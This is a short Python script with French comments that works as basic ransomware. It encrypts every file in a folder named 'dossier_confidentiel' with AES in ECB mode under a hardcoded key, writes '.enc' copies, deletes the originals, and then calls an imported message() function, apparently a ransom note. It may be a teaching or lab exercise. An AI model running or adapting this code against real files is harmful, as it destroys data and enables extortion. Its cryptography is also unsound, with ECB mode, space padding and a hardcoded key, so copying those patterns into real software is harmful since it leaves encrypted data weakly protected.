import os
from Crypto.Cipher import AES
from message import *


# Fonction pour remplir les datas à 16 octets
def pad(data):
    return data + b' ' * (16 - len(data) % 16)


# Fonction de chiffrement
def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_ECB)
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = cipher.encrypt(pad(data))
    # Écriture du fichier chiffré
    with open(file_path + '.enc', 'wb') as f:
        f.write(encrypted_data)
    os.remove(file_path)  # Supprime le fichier original => cible


# Clé de 16
key = b'SixteenByteKey!l'

# Dossier cible
folder = 'dossier_confidentiel'

# Si le dossier existe
if os.path.exists(folder):
    print(f"Chiffrement des fichiers dans le dossier : {folder}")
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)
            print(f"Fichier chiffré : {file_path}")
    print("Tous les fichiers ont été chiffrés avec succès.")
else:
    print(f"Erreur : Le dossier '{folder}' est introuvable.")

message()
